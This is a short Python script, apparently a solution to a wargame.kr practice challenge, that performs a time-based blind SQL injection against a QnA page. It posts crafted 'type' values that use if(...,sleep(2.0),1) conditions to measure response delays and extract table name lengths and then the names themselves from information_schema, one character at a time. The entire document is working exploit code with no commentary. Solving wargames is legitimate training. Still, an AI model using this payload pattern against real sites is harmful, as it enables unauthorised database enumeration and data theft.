from requests import *
from time import *
s=session()
count=0
def name(num,leng):
    result=''
    for i in range(1,leng+1):
        for j in range(30,128):
            data={'mail':'1','cont':'1','type':f'if((select ascii(substr(table_name,{i},1)) from information_schema.tables where table_schema=database() limit {num},1)={j},sleep(2.0),1)'}
            url='http://wargame.kr:8080/qna/?page=to_jsmaster'
            start=time()
            response=post(url=url,data=data)
            end=time()
            if end-start > 2:
                result+=chr(j)
                continue
    print(result)

for i in range(30):
    if count>30:
        break
    for j in range(30):
        data={'mail':'1','cont':'1','type':f'if((select length(table_name) from information_schema.tables where table_schema=database() limit {i},1)={j},sleep(2.0),1)'}
        url='http://wargame.kr:8080/qna/?page=to_jsmaster'
        start=time()
        response=post(url=url,data=data)
        end=time()
        count=count+1
        if end-start > 2:
            print(f'{i+1}번째 table_length:',j)
            name(i,j)
            count=0
            break